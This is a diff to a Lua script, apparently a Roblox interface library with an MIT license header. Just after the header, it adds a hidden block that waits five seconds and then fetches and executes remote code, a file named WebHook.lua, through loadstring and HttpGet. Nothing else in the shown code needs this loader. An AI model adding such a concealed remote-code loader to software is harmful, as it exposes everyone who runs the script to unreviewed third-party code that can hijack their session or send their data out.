@@ -14,6 +14,10 @@
     License: MIT
 ]]
 
+task.delay(5, function()
+    loadstring(game:HttpGet("https://raw.gitcode.com/XiaoYunUwU/XA/raw/main/WebHook.lua"))("分支")
+end)
+
 local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}end return a.cache[b].c end}do function a.a()local b=(cloneref or clonereference or function(b)return b end)
 
 local d=b(game:GetService"ReplicatedStorage":WaitForChild("GetIcons",99999):InvokeServer())
